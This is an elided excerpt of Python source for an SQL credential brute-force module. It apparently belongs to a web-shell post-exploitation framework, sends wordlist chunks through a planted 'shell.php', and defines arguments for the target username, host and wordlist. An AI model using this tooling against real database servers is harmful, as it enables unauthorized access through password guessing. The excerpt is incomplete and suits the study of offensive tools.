...
class Sql(Module):
    ...
    def _set_vectors(self):
        self.support_vectors.add_vector(
            'check_connect', 'shell.php',  "(is_callable('$dbms_connect') && print(1)) || print(0);")
    ...
    def _set_args(self):
        self.argparser.add_argument(
            'username', help='SQL username to bruteforce')
        self.argparser.add_argument(
            '-hostname', help='DBMS host or host:port', default='127.0.0.1')
        self.argparser.add_argument('-wordfile', help='Local wordlist path')
        self.argparser.add_argument(
            '-startline', help='Start line of local wordlist', type=int, default=0)
        self.argparser.add_argument('-chunksize', type=int, default=5000)
        self.argparser.add_argument(
            '-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=type([]), default=[])
        self.argparser.add_argument(
            ...
            if self.args['wordfile']:
                try:
                    ...
                    raise ProbeException(
                        self.name,  '\'%s\' %s' % (self.args['wordfile'], WARN_NO_SUCH_FILE))
                else:
    ...
    def _probe(self):
        ...
        for chunk in self.args['wordlist']:
            ...
            joined_chunk = '\\n'.join(chunk)
            formatted_args = {'hostname': self.args['hostname'], 'username': self.args[
                'username'], 'post_field': post_field, 'data': joined_chunk}
